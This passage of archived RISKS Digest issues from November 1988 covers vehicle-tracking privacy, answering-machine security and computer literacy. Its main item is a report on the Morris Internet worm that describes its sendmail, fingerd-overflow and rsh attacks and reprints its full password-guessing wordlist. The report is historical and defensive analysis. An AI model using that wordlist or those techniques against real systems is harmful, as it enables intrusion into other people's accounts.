   they are reacting, 2) identify the particular issue or issues
   raised in the publication(s), 3) identify the ethical
   implications of the issue or issues, 4) identify the ethical
   paradigm on which the author seems to be depending, 5) add their
   own reasons for agreement or disagreement with the viewpoint of
   the publication's author, 6) and, finally, offer an alternative
   solution or viewpoint to that presented by the author, or
   present other appropriate considerations not raised by the
   author or covered in their own previous comments under #5 above.
   The instructor will send to the student, by electronic mail, a
   weekly grade on the student's posted reaction, together with
   whatever comments the instructor thinks helpful. The student's
   original posted reaction will be open to public comment by the
   other students in the seminar [this will be accomplished by
   posting notes to the bulletin board, referencing the original
   reaction]. These latter comments by the other students in the
   seminar will form the basis for the "participation" factor of
   the semester grade.
Evaluation: Each student's semester grade for the seminar will be
calculated according to the following weighted formula:
      - 13 posted reactions (at 5% each)                = 65%
      - Participation (based on posted comments on
        other students' reactions)                      = 20%
      - Final Exam                                      = 15%
Send comments to: Bob Barger&lt;cfrnb@ecncdc.bitnet&gt;.
Suggestions for texts in computer ethics are especially sollicited.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
UK vehicle-identification systems
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Thu, 10 Nov 88 18:06:52 CST
</i><PRE>

In his 9 Nov 88 11:21:15 PST RISKS contribution, Chaz Heritage suggested that
the electronic number plates to be fitted on every vehicle were to be some kind
of IFF (Identification: Friend or Foe) device.  This suggests an active
electronic transponder of some type.  In fact, the technology needed for road
vehicle identification is much simpler, comparable to the automatic car
location technology used by the railroads.  In the United States, we use a
black rectangle painted on the side of each railroad car, on which colored tape
has been fixed in a machine readable pattern.  Bar code scanners located at the
track side can read these as the train moves.  (aside: the bar code is read
vertically, so it remains readable independently of the direction of train
motion, and there is a wide latitude in the allowed positions of the code.)
The only problem with the US system is that the code has to be washed once in a
while or it gets grime covered and unreadable.

In the UK, I heard about 15 years ago that they were experimenting
with a microwave readable bar code for automatic car location.
This was readable through arbitrary accumulations of grime, and
was constructed of a metal channel with covers welded over the
channel to give a binary code.  Something like this, mounted on
the underside of a car, would be quite practical for automatic
road vehicle identification, with sensors reading from below
as the car passes through the "toll station".

The risk of such sensors as police devices depends to a great extent on how
easy it is to instrument locations in the roadway without the driver being
aware of it.  The grime-proof channel described above would be read from below,
and a car would have to pass directly over the reader, so it wouldn't work on
the open road, where cars could easily dodge the sensor.  US style bar codes
are easily covered, but when exposed, can be read from an inconspicuous
roadside scanner.  Aircraft style IFF devices would allow actual tracking of
cars from a distance without fixed scanners.

Douglas W. Jones, University of Iowa   	jones@herky.cs.uiowa.edu

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
UK vehicle-id systems... Big Brother's new eyes?
</A>
</H3>
<address>
&lt;<A HREF="mailto:hadj@sbcs.sunysb.edu">
hadj@sbcs.sunysb.edu
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 19:20:08 EST
</i><PRE>

In RISKS 7.74 "chaz_heritage.WGC1RX"@Xerox.COM writes:

&gt;Every vehicle in the country would have to be fitted with what is described
&gt;as an 'electronic number-plate'. ...

&gt;When the IFF-equipped vehicle is driven through a toll point, its IFF is
&gt;interrogated by devices installed in the road surface. It then transmits,
&gt;by some means, the vehicle's registration number to the interrogation
&gt;devices. These communicate directly with the road owner's computer system.
&gt;Clearly this computer system must either be connected to, or share a common
&gt;database with, the Driver and Vehicle Licensing Centre at Swansea, which
&gt;holds all records of registered vehicles. ...

&gt;... There has,
&gt;of course, been no suggestion that the interrogation devices might also be
&gt;connected to the Police National Computer, since such a suggestion would be
&gt;either what the Government call 'irresponsible journalism' (if it were not
&gt;demonstrably true) or a breach of the Official Secrets Acts (if it were). ...

&gt;It would, of course, have to be made a crime to drive without an IFF
&gt;device, or with a faulty one (how one is supposed to establish that one's
&gt;IFF is working correctly - when its principle of operation is apparently a
&gt;secret -  is not clear).

I find this to be a terrifying bit of news, based on the fact that a
government will always use the information it can get access to, if
necessary...(if a court can get access to a reporter's notes, why not
a road owner's database?)

Possible uses:
1) the use of such travel information in a case against a suspected
criminal:
	Lawyer: "Where were you on the night of Nov 8, 1988?"
	Defendant:"I was sitting at home watching TV."
	Lawyer: "Not true! Your car was observed passing toll
			FOO on interstate BAR!"

2) the use of such information to find lawbreakers:
A trivial example: such information could be used to catch people
speeding on the highway. Attach a timestamp to each event and
calculate v = dx/dt.

There is, of course, nothing wrong with catching criminals. However,
the described system depends on privately owned computers and
various unreliable components (transmitters, etc) which are not
impervious to accidental or deliberate tampering. It seems easy
enough to fake evidence of this sort. Even if we assume the database
is 100% secure, the data collected could be corrupted. It seems
unlikely that the IFF boxes will be immune to reverse engineering.
Imagine a box that sends out a random ID signal every time it passes
though a toll point.

It is troublesome to think that somewhere, in some computer
database, there is a record of where and when some computer _thinks_
that i was detected driving my car.

The potential for invasion of privacy is enormous, and made more
frightening by the fallibility of the system. It is a powerful
system based on an insecure database. It would give Big Brother
one more set of eyes on the world.

-mike hadjimichael.

{ hadj@sbcs.sunysb.edu                        {philabs, allegra}!sbcs!hadj }
{ departmentofcomputersciencesunystonybrookstonybrooknyoneonesevenninefour }

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Phone-answerer/ voicemail security &amp; voice-encryption
</A>
</H3>
<address>

&lt;<A HREF="mailto:jik@ATHENA.MIT.EDU">
jik@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 10 Nov 88 18:05:11 EST
</i><PRE>

   Date: Wed, 09 Nov 88 13:42:33 -0800
   From: "David A. Honig" &lt;honig@bonnie.ICS.UCI.EDU&gt;

   Unauthorized phone-answering-machine playback and unauthorized
   centralized-voicemail message playback could be made more difficult
   by encrypting the stored messages.  This could be done at the same
   time as data compression preprocessing on digital systems.  (There
   are analog "encryption" methods but these days everything's cheaper
   digitally...)

Yes, but the whole point is that the answering machines currently on the market
provide minimal message security because the access codes are so ridiculously
simple to "crack" (I place "crack" in quotes because I'm not sure the task is
difficult enough to call it "cracking.").  In order for encrypted-data
answering machines to allow remote message access, they would expect you to
enter the decryption key over the phone line.  If the decryption key is complex
enough that it cannot be guessed (which is really the question is being asked
here), then why use encryption at all?  Just use that key as the password, and
security is assured (as much as it can be, at least).

In other words, I fail to see how data encryption provides an increased measure
of security in the context of the problem we are discussing, which is the lack
of a secure password.

Jonathan Kamens, Massachusetts Institute of Technology -- Project Athena

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Ultrasonic emissions a real problem
</A>
</H3>
<address>
Travis Lee Winfrey
&lt;<A HREF="mailto:travis@douglass.cs.columbia.edu ">
travis@douglass.cs.columbia.edu 
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 15:36:34 EST
</i><PRE>

&gt;Date: Mon, 07 Nov 88 18:13:29 EST
&gt;From: Geoffrey Welsh &lt;izot@f171.n221.z1.fidonet.org&gt;
&gt;Subject: Ultrasonic emissions a real problem
&gt;   What, then, leads some of us to be sensitive to these frequencies to a
&gt;fault and others to be completely unaware of them? Worse, how can we determine
&gt;what levels are acceptable, given that some people are simply more sensitive
&gt;than others?

Although I don't know why, asthmatics are known to hear very high sound
frequencies, well over 22 KHz.  I've been able to hear terminals, TVs, dog
whistles since I was very young.  Brand X CRT's and Kaypro's have made me
clap my hands to my ears.
 
&gt;   If indeed ultrasonic emissions are a cause of illness or other unacceptable
&gt;consequences, it is vital that a study into the area be launched. Who knows;
&gt;in a few years we may find our present CRTs replaced with ones that have a
&gt;horizontal scan rate above 30 KHz to avoid this problem.

It was explained to me once.  There is a common component in RGB CRT's
which alternates very rapidly, around 26-28 KHz.  Particularly in older
TV's, this component takes a while to cycle up, which is why when someone
turns on a TV in the next apartment (or building!), I can hear the
high-pitched sound it makes begin loudly then almost disappear.

I personally would worry more about vision, back, and stress problems
caused by introducing computers into the workplace.  The high-pitched
sounds falls more into the category of Stupid People Tricks.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.74.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.76.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-28</DOCNO>
<DOCOLDNO>IA012-000131-B035-110</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.76.html 128.240.150.127 19970217023842 text/html 26414
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:37:09 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 76</TITLE>
<LINK REL="Prev" HREF="/Risks/7.75.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.77.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.75.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.77.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 76</H1>
<H2> Saturday 12 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer Literacy #2 
</A>
<DD>
<A HREF="#subj1.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A Report on the Internet Worm 
</A>
<DD>
<A HREF="#subj2.1">
Bob Page in VIRUS-L
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  NSA attempts to restrict virus information 
</A>
<DD>
<A HREF="#subj3.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Who is responsible for the sendmail fiasco? 
</A>
<DD>
<A HREF="#subj4.1">
Bob Frankston
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computer Literacy #2
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@juicy-juice.lcs.mit.edu ">
ronni@juicy-juice.lcs.mit.edu 
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 16:43:58 EST
</i><PRE>

A typical computer-literacy course has the following components.  What do you
think of this operational description of computer literacy?  Should other
topics be taught instead? in addition to these?  Should everyone study this?
As before, send mail to RISKS or to me, depending on your preference.

1. TERMINOLOGY AND JARGON:  This is designed to enable students to "talk
knowledgeably" about computers.  Here are some definitions of a computer, from
computer-literacy textbooks:
 *  "A computer is an electronic machine that solves problems or answers
    questions.""
 *  "A computer ... is a machine that can handle large amounts of information
    and work with amazing speed."
 *  "A computer is an electronic tool that helps people do many different
    things faster, easier, or better."

Here is another definition, from a graduate computer-literacy class (for
teachers, administrators, computer coordinators, and so on):
 *  "An operating system is a program that tells the computer how to deal with
    information -- tells it how to move information, how to operate, how to
    do things. ...  An operating system is done in a lower level language,
    machine language.  It really controls the flow of electricity through the
    circuits."

2. HARDWARE:  This is designed to give students a "working knowledge of
computer equipment."  Typical classes use Apple IIs.  The last large surveys
show a national average of 1 machine per 40 students (grades K-12).  Many
schools cannot afford two disk drives per machine.  A computer lab of 10-30
machines might have 1-3 printers (dot matrix).  Devices such as joysticks,
mice, and touch-sensitive displays are too expensive for most schools to buy
(or these devices operate on machines that are too expensive), but some
schools buy one of each, to pass around a class.  The emphasis is on
identifying components and handling equipment (e.g., floppy disks).  A 1988
survey showed that among 11th grade students:
 *  30% did not know what a cursor does,
 *  60% did not know what a modem does, and
 *  40% could not identify a spreadsheet as a software component or a video
    display as a hardware component.

3. SOFTWARE:  Exposure to "basic software concepts" is designed to enable
students to use computers as tools and to "remove the mystery of computers."
Typical classes show programs for word processing (which predominates),
spreadsheets, and databases -- ones that run on Apple IIs (or, in many cases,
smaller machines).  Students do not see actual program documentation.  The
emphasis is on the syntax of program commands.  The survey cited above showed
that students scored
 *  72% correct on word-processing questions
 *  52% correct on spreadsheet questions
 *  31% correct on database questions

4. PROGRAMMING:  When included, this means BASIC or LOGO programming.  Again,
the emphasis is on learning the syntax of some language commands.  Miniscule
programs (e.g., 10 lines) predominate.

5.  JOBS IN COMPUTING:  When included, this means brief discussion of careers
in computing.  There is a widespread sense that "computer literacy" is the
passport to well paying jobs.

6.  SOCIAL IMPACTS OF COMPUTERS:  When included, this encompasses computer
uses, ethics, and legal implications.  Under uses, students might be told, for
instance, that the FBI uses computers to store data on criminals and crimes,
but not about privacy risks, data quality problems, etc.  Students might be
told that some people lose jobs because of computer automation -- and that
these people can get other jobs working with computers.  Ethics means a mention
of computer crime.  Legal implications means a warning that students should not
copy software disks they use in class.  Students are explicitly encouraged to
have "positive attitudes about computers."  Topics not covered include
whistleblowing, the military influence on the computer profession, limits of
simulations, and risks of large computer systems.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
(long) report on the Internet Worm
</A>
</H3>
<address>
Ken van Wyk 
&lt;<A HREF="mailto:luken@SPOT.CC.LEHIGH.EDU">
luken@SPOT.CC.LEHIGH.EDU
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 13:57:42 EST
</i><PRE>

                     A REPORT ON THE INTERNET WORM

                               Bob Page
                          University of Lowell
                      Computer Science Department


                            November 7, 1988


     [Because of the many misquotes the media have been giving,
     this report is Copyright (c) Bob Page, all rights reserved.
     Permission is granted to republish this ONLY if you republish
     it in its entirety.]


Here's the scoop on the "Internet Worm".  Actually it's not a virus -
a virus is a piece of code that adds itself to other programs,
including operating systems.  It cannot run independently, but rather
requires that its "host" program be run to activate it.  As such, it
has a clear analog to biologic viruses -- those viruses are not
considered live, but they invade host cells and take them over, making
them produce new viruses.

A worm is a program that can run by itself and can propagate a fully
working version of itself to other machines.  As such, what was loosed
on the Internet was clearly a worm.

This data was collected through an emergency mailing list set up by
Gene Spafford at Purdue University, for administrators of major
Internet sites - some of the text is included verbatim from that list.
Mail was heavy since the formation of the list; it continues to be on
Monday afternoon - I get at least 2-3 messages every hour.  It's
possible that some of this information is incomplete, but I thought
you'd like to know what I know so far.

The basic object of the worm is to get a shell on another machine so
it can reproduce further.  There are three ways it attacks: sendmail,
fingerd, and rsh/rexec.


THE SENDMAIL ATTACK:

In the sendmail attack, the worm opens a TCP connection to another
machine's sendmail (the SMTP port), invokes debug mode, and sends a
RCPT TO that requests its data be piped through a shell.  That data, a
shell script (first-stage bootstrap) creates a temporary second-stage
bootstrap file called x$$,l1.c (where '$$' is the current process ID).
This is a small (40-line) C program.

The first-stage bootstrap compiles this program with the local cc and
executes it with arguments giving the Internet hostid/socket/password
of where it just came from.  The second-stage bootstrap (the compiled
C program) sucks over two object files, x$$,vax.o and x$$,sun3.o from
the attacking host.  It has an array for 20 file names (presumably for
20 different machines), but only two (vax and sun) were compiled in to
this code.  It then figures out whether it's running under BSD or
SunOS and links the appropriate file against the C library to produce
an executable program called /usr/tmp/sh - so it looks like the Bourne
shell to anyone who looked there.


THE FINGERD ATTACK:

In the fingerd attack, it tries to infiltrate systems via a bug in
fingerd, the finger daemon.  Apparently this is where most of its
success was (not in sendmail, as was originally reported).  When
fingerd is connected to, it reads its arguments from a pipe, but
doesn't limit how much it reads.  If it reads more than the internal
512-byte buffer allowed, it writes past the end of its stack.  After
the stack is a command to be executed ("/usr/ucb/finger") that
actually does the work.  On a VAX, the worm knew how much further from
the stack it had to clobber to get to this command, which it replaced
with the command "/bin/sh" (the bourne shell).  So instead of the
finger command being executed, a shell was started with no arguments.
Since this is run in the context of the finger daemon, stdin and
stdout are connected to the network socket, and all the files were
sucked over just like the shell that sendmail provided.


THE RSH/REXEC ATTACK:

The third way it tried to get into systems was via the .rhosts and
/etc/hosts.equiv files to determine 'trusted' hosts where it might be
able to migrate to.  To use the .rhosts feature, it needed to actually
get into people's accounts - since the worm was not running as root
(it was running as daemon) it had to figure out people's passwords.
To do this, it went through the /etc/passwd file, trying to guess
passwords.  It tried combinations of: the username, the last, first,
last+first, nick names (from the GECOS field), and a list of special
"popular" passwords:

aaa          cornelius        guntis      noxious    simon
academia      couscous        hacker      nutrition    simple
aerobics      creation        hamlet      nyquist    singer
airplane      creosote        handily      oceanography    single
albany          cretin        happening      ocelot    smile
albatross     daemon        harmony      olivetti    smiles
albert          dancer        harold      olivia    smooch
alex          daniel        harvey      oracle    smother
alexander     danny        hebrides      orca        snatch
algebra          dave        heinlein      orwell    snoopy
aliases          december        hello      osiris    soap
alphabet      defoe        help      outlaw    socrates
ama          deluge        herbert      oxford    sossina
amorphous     desperate        hiawatha      pacific    sparrows
analog          develop        hibernia      painless    spit
anchor          dieter        honey      pakistan    spring
andromache    digital        horse      pam        springer
animals          discovery        horus      papers    squires
answer          disney        hutchins      password    strangle
anthropogenic dog        imbroglio      patricia    stratford
anvils          drought        imperial      penguin    stuttgart
anything      duncan        include      peoria    subway
aria          eager        ingres      percolate    success
ariadne          easier        inna      persimmon    summer
arrow          edges        innocuous      persona    super
arthur          edinburgh        irishman      pete        superstage
athena          edwin        isis      peter        support
atmosphere    edwina        japan      philip    supported
aztecs          egghead        jessica      phoenix    surfer
azure          eiderdown        jester      pierre    suzanne
bacchus          eileen        jixian      pizza        swearer
bailey          einstein        johnny      plover    symmetry
banana          elephant        joseph      plymouth    tangerine
bananas          elizabeth        joshua      polynomial    tape
bandit          ellen        judith      pondering    target
banks          emerald        juggle      pork        tarragon
barber          engine        julia      poster    taylor
baritone      engineer        kathleen      praise    telephone
bass          enterprise    kermit      precious    temptation
bassoon          enzyme        kernel      prelude    thailand
batman          ersatz        kirkland      prince    tiger
beater          establish        knight      princeton    toggle
beauty          estate        ladle      protect    tomato
beethoven     euclid        lambda      protozoa    topography
beloved          evelyn        lamination      pumpkin    tortoise
benz          extension        larkin      puneet    toyota
beowulf          fairway        larry      puppet    trails
berkeley      felicia        lazarus      rabbit    trivial
berliner      fender        lebesgue      rachmaninoff    trombone
beryl          fermat        lee          rainbow    tubas
beverly          fidelity        leland      raindrop    tuttle
bicameral     finite        leroy      raleigh    umesh
bob          fishers        lewis      random    unhappy
brenda          flakes        light      rascal    unicorn
brian          float        lisa      really    unknown
bridget          flower        louis      rebecca    urchin
broadway      flowers        lynne      remote    utility
bumbling      foolproof        macintosh      rick        vasant
burgess          football        mack      ripple    vertigo
campanile     foresight        maggot      robotics    vicky
cantor          format        magic      rochester    village
cardinal      forsythe        malcolm      rolex        virginia
carmen          fourier        mark      romano    warren
carolina      fred        markus      ronald    water
caroline      friend        marty      rosebud    weenie
cascades      frighten        marvin      rosemary    whatnot
castle          fun        master      roses        whiting
cat          fungible        maurice      ruben        whitney
cayuga          gabriel        mellon      rules        will
celtics          gardner        merlin      ruth        william
cerulean      garfield        mets      sal        williamsburg
change          gauss        michael      saxon        willie
charles          george        michelle      scamper    winston
charming      gertrude        mike      scheme    wisconsin
charon          ginger        minimum      scott        wizard
chester          glacier        minsky      scotty    wombat
cigar          gnu        moguls      secret    woodwind
classic          golfer        moose      sensor    wormwood
clusters      gorgeous        morley      serenity    yaco
coffee          gorges        mozart      sharks    yang
coke          gosling        nancy      sharon    yellowstone
collins          gouge        napoleon      sheffield    yosemite
commrades     graham        nepenthe      sheldon    zap
computer      gryphon        ness      shiva        zimmerman
condo          guest        network      shivers
cookie          guitar        newton      shuttle
cooper          gumption        next      signature

[I wouldn't have picked some of these as "popular" passwords, but
then again, I'm not a worm writer.  What do I know?]

When everything else fails, it opens /usr/dict/words and tries every
word in the dictionary.  It is pretty successful in finding passwords,
as most people don't choose them very well.  Once it gets into
someone's account, it looks for a .rhosts file and does an 'rsh'
and/or 'rexec' to another host, it sucks over the necessary files into
/usr/tmp and runs /usr/tmp/sh to start all over again.


Between these three methods of attack (sendmail, fingerd, .rhosts)
it was able to spread very quickly.


THE WORM ITSELF:

The 'sh' program is the actual worm.  When it starts up it clobbers
its argv array so a 'ps' will not show its name.  It opens all its
necessary files, then unlinks (deletes) them so they can't be found
(since it has them open, however, it can still access the contents).
It then tries to infect as many other hosts as possible - when it
sucessfully connects to one host, it forks a child to continue the
infection while the parent keeps on trying new hosts.

One of the things it does before it attacks a host is connect to the
telnet port and immediately close it.  Thus, "telnetd: ttloop: peer
died" in /usr/adm/messages means the worm attempted an attack.

The worm's role in life is to reproduce - nothing more.  To do that it
needs to find other hosts.  It does a 'netstat -r -n' to find local
routes to other hosts &amp; networks, looks in /etc/hosts, and uses the
yellow pages distributed hosts file if it's available.  Any time it
finds a host, it tries to infect it through one of the three methods,
see above.  Once it finds a local network (like 129.63.nn.nn for
ulowell) it sequentially tries every address in that range.

If the system crashes or is rebooted, most system boot procedures
clear /tmp and /usr/tmp as a matter of course, erasing any evidence.
However, sendmail log files show mail coming in from user /dev/null
for user /bin/sed, which is a tipoff that the worm entered.

Each time the worm is started, there is a 1/15 chance (it calls
random()) that it sends a single byte to ernie.berkeley.edu on some
magic port, apparently to act as some kind of monitoring mechanism.


THE CRACKDOWN:

Three main 'swat' teams from Berkeley, MIT and Purdue found copies of
the VAX code (the .o files had all the symbols intact with somewhat
meaningful names) and disassembled it into about 3000 lines of C.  The
BSD development team poked fun at the code, even going so far to point
out bugs in the code and supplying source patches for it!  They have
not released the actual source code, however, and refuse to do so.
That could change - there are a number of people who want to see the
code.

Portions of the code appear incomplete, as if the program development
was not yet finished.  For example, it knows the offset needed to
break the BSD fingerd, but doesn't know the correct offset for Sun's
fingerd (which causes it to dump core); it also doesn't erase its
tracks as cleverly as it might; and so on.

The worm uses a variable called 'pleasequit' but doesn't correctly
initialize it, so some folks added a module called _worm.o to the C
library, which is produced from:
        int pleasequit = -1;
the fact that this value is set to -1 will cause it to exit after one
iteration.

The close scrutiny of the code also turned up comments on the
programmer's style.  Verbatim from someone at MIT:
    From disassembling the code, it looks like the programmer
    is really anally retentive about checking return codes,
    and, in addition, prefers to use array indexing instead of
    pointers to walk through arrays.

Anyone who looks at the binary will not see any embedded strings -
they are XOR'ed with 81 (hex).  That's how the shell commands are
imbedded.  The "obvious" passwords are stored with their high bit set.

Although it spreads very fast, it is somewhat slowed down by the fact
that it drives the load average up on the machine - this is due to all
the encryptions going on, and the large number of incoming worms from
other machines.

[Initially, the fastest defense against the worm is is to create a
directory called /usr/tmp/sh.  The script that creates /usr/tmp/sh
from one of the .o files checks to see if /usr/tmp/sh exists, but not
to see if it's a directory.  This fix is known as 'the condom'.]


NOW WHAT?

None of the ULowell machines were hit by the worm.  When BBN staffers
found their systems infected, they cut themselves off from all other
hosts.  Since our connection to the Internet is through BBN, we were
cut off as well.  Before we were cut off, I received mail about the
sendmail problem and installed a patch to disable the feature the worm
uses to get in through sendmail.  I had made local modifications to
fingerd which changed the offsets, so any attempt to scribble over the
stack would probably have ended up in a core dump.

Most Internet systems running 4.3BSD or SunOS have installed the
necessary patches to close the holes and have rejoined the Internet.
As you would expect, there is a renewed interest in system/network
security, finding and plugging holes, and speculation over what
will happen to the worm's creator.

If you haven't read or watched the news, various log files have named
the responsible person as Robert Morris Jr., a 23-year old doctoral
student at Cornell.  His father is head of the National Computer
Security Center, the NSA's public effort in computer security, and has
lectured widely on security aspects of UNIX.

Associates of the student claim the worm was a 'mistake' - that he
intended to unleash it but it was not supposed to move so quickly or
spread so much.  His goal (from what I understand) was to have a
program 'live' within the Internet.  If the reports that he intended
it to spread slowly are true, then it's possible that the bytes sent
to ernie.berkeley.edu were intended to monitor the spread of the
worm.  Some news reports mentioned that he panicked when, via some
"monitoring mechanism" he saw how fast it had propagated.

A source inside DEC reports that although the worm didn't make much
progress there, it was sighted on several machines that wouldn't be
on its normal propagation path, i.e. not gateways and not on the same
subnet.  These machines are not reachable from the outside.  Morris
was a summer intern at DEC in '87.  He might have included names or
addresses he remembered as targets for infesting hidden internal
networks.  Most of the DEC machines in question belong to the group he
worked in.

The final word has not been written - I don't think the FBI have even
met with this guy yet.  It will be interesting to see what happens.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
NSA attempts to restrict virus information
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 18:56:45 PST
</i><PRE>

The following excerpts are from THE NEW YORK TIMES, Nov 11 1988 p. 12:

US IS MOVING TO RESTRICT ACCESS TO FACTS ABOUT COMPUTER VIRUS by John Markoff

Government officials are moving to bar wider dissemination of information 
on techniques used in a rogue software program that jammed more than 6,000
computers in a nationwide computer network last week.

Their action comes amid bitter debate among computer scientists ... One group
of experts believes wide publication of such information would permit
computer network experts to identify problems more quickly and to correct 
flaws in their systems.  But others argue that such information is too 
potentially explosive to be widely circulated.

Yesterday, officials at the National Computer Security Center, a division of 
the National Security Agency, contacted researchers at Purdue University in
West Lafayette, Ind., and asked them to remove information from campus
computers describing internal workings of the software program that jammed
computers around the nation on Nov. 3. ...  (A spokesperson) said the agency
was concerned because it was not certain that all computer sites had corrected
the software problems that permitted the program to invade systems in the 
first place. ...

Some computer security experts said they were concerned that techniques
developed in the program would be widely exploited by those trying to break
into computer systems. ...

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Who is responsible for the sendmail fiasco?
</A>
</H3>
<address>
&lt;<A HREF="mailto:bobf@lotus.UUCP">
bobf@lotus.UUCP
</A>&gt;
</address>
<i>
Wed Nov  9 01:42:09 1988
</i><PRE>

The lesson from the PC world is that we can assign official responsibility to
the system administrators but in practice they should not be expected to have
the expertise.  The expertise lies with those distributing turnkey workstation
systems.  Sun?  Berkeley??
                                             Bob Frankston

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.75.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.77.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-29</DOCNO>
<DOCOLDNO>IA012-000131-B035-122</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.77.html 128.240.150.127 19970217023853 text/html 25059
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:37:23 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 77</TITLE>
